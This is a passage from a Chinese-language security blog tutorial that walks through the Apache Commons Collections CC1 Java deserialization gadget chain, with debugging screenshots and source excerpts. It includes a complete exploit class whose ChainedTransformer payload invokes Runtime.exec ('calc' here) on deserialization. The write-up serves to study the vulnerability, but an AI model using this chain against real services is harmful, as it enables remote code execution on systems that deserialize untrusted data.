punctuation">.</span>keyTransformer <span class="token operator">=</span> keyTransformer<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer <span class="token operator">=</span> valueTransformer<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很容易发现InvokerTransformer#decorate进行了实例化，并且是public static类型。为了调用InvokerTransformer#transform，<strong>要令valueTransformer&#x3D;new InvokerTransformer()</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Map <span class="token function">decorate</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> keyTransformer<span class="token punctuation">,</span> valueTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>decorate就是为了给map装饰上key和value，那么接下来我们就要找哪里调用checksetValue了。只有1处调用：AbstractInputCheckedMapDecorator.MapEntry#setValue</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">setValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    value <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>parent是通过protected类型的构造方法赋值，**parent要赋值new TransformedMap()**。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token function">MapEntry</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry<span class="token punctuation">,</span> AbstractInputCheckedMapDecorator parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来要找哪里调用了setValue方法。首先我们要知道遍历Map可以通过Map.Entry进行遍历，而其中有entry.setValue方法。</p><p>那么如何调用AbstractInputCheckedMapDecorator.MapEntry的setValue方法？</p><p>之前我们调用了decorate方法实例化TransformedMap，而TransformedMap的父类正是AbstractInputCheckedMapDecorator，如果我们遍历TransformedMap类型的Map，那么自己没有setValue方法自然就调用了父类的setValue方法，因此我们遍历TransformedMap这个类型的Map就可以了。</p><p>还要注意一点，遍历Map要保证Map不为空，不然都进不去for循环自然调用不了setValue方法。</p><p>此时的exp：</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Runtime r<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer invokerTransformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformedMap<span class="token operator">=</span>TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry<span class="token operator">:</span>transformedMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//debug调试，setValue的参数正是最后传到InvokerTransformer#transform的input，因此这里就是赋值Runtime的实例化。</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来找谁调用了setValue，我们发现AnnotationInvocationHandler的readobject直接就调用了setValue。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//...略</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> memberValue <span class="token operator">:</span> memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// i.e. member still exists</span>                Object value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span>                      value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察该类的构造方法为default，因此我们只能通过反射来调用。</p><pre class="line-numbers language-java"><code class="language-java">        Class <span class="token class-name">c</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor annotationInvocationHandlerConstructor <span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o<span class="token operator">=</span>annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>反射调用后，是不是觉得可以尝试反序列化测试了？</p><p>注意前面的注释，Runtime类是不可以被序列化的，因此我们不能通过Runtime.getRuntime()来进行序列化，因此我们也需要反射来调用。</p><pre class="line-numbers language-java"><code class="language-java">        Method method<span class="token operator">=</span> <span class="token punctuation">(</span>Method<span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Runtime r<span class="token operator">=</span> <span class="token punctuation">(</span>Runtime<span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果仔细调试或者阅读源码就会发现仅仅凭借InvokerTransformer是走不通的，因为可以看到checkSetValue只调用了一次transform，并且AnnotationInvocationHandler#readobject给Map赋值是写死为new AnnotationTypeMismatchExceptionProxy的，而我们要传进来的是Runtime.class（因为要RCE），所以你没办法通过InvokerTransforme直接反射RCE。</p><p>而我们发现，Transformer的实现有这重要的三种：</p><ol><li>ConstantTransformer –&gt; 把⼀个对象转换为常量</li><li>InvokerTransformer –&gt; 通过反射，返回⼀个对象 -&gt; 反射获取执行方法加入参数</li><li>ChainedTransformer –&gt;执⾏链式的Transformer⽅法 -&gt;将反射包含的数组进行链式调用，从而连贯起来</li></ol><p><strong>因此，我们就可以通过ChainedTransformer达到调用多次transform方法的目的，该函数是把前一个的输出当作当前的transform方法的输入执行。并且我们可以看到数组第一个元素为new ConstantTransformer(Runtime.class)，该类把⼀个对象转换为常量，也就是说我们传进去Runtime.class，他就会返回Runtime.class，而不是annotationTypeMismatchExceptionProxy，这也就绕过了之前提到写死的参数。</strong></p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回顾checkSetValue。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> Object <span class="token function">checkSetValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>回顾AnnotationInvocationHandler的readobject关键代码。</p><pre class="line-numbers language-java"><code class="language-java">                    memberValue<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>                        <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="调试-链子"><a href="#调试-链子" class="headerlink" title="调试+链子"></a>调试+链子</h5><p>首先反序列化执行AnnotationInvocationHandler#readobject，调用了setValue方法，并且写死了传入的参数。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818222425288.png" alt="image-20220818222425288"  /><p>接着调用了AbstractInputCheckedMapDecorator#setValue,可以看到parent为TransformedMap，这也是为什么要Map&lt;Object,Object&gt; transformedMap&#x3D;TransformedMap.decorate(map,null,c)的原因，就是为了调用他的父类AbstractInputCheckedMapDecorator#setValue方法</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818223127855.png" alt="image-20220818223127855"></p><p>继续跟进，此时value还是写死的参数。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224244527.png" alt="image-20220818224244527"></p><p>进入到链式调用transform</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224356049.png" alt="image-20220818224356049"></p><p>单步执行。此时会执行谁的transform呢？</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224442142.png" alt="image-20220818224442142"></p><p>跟进去看看，当然是执行ConstantTransformer的transform啦。因为我们链式调用数组的第一个元素就是ConstantTransformer，因此他直接返回构造函数构造好的iConstant，也就是Runtime.class!!覆盖了写死的值。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818224550799.png" alt="image-20220818224550799"></p><p>之后就把ConstantTransformer#transform的输出Runtime.class传给下一个transform的input，也就是invoke getRuntime方法从而获取实例，接着在通过获取到的示例执行exec方法即可RCE。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220818225352146.png" alt="image-20220818225352146"></p><p>链子比较短，但是坑点比较多。</p><pre class="line-numbers language-java"><code class="language-java">AnnotationInvocationHandler#readobjectAbstractInputCheckedMapDecorator<span class="token punctuation">.</span>MapEntry#setValueTransformedMap#checksetValueInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC1Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformedMap<span class="token operator">=</span>TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">cc</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor annotationInvocationHandlerConstructor <span class="token operator">=</span>cc<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o<span class="token operator">=</span>annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token 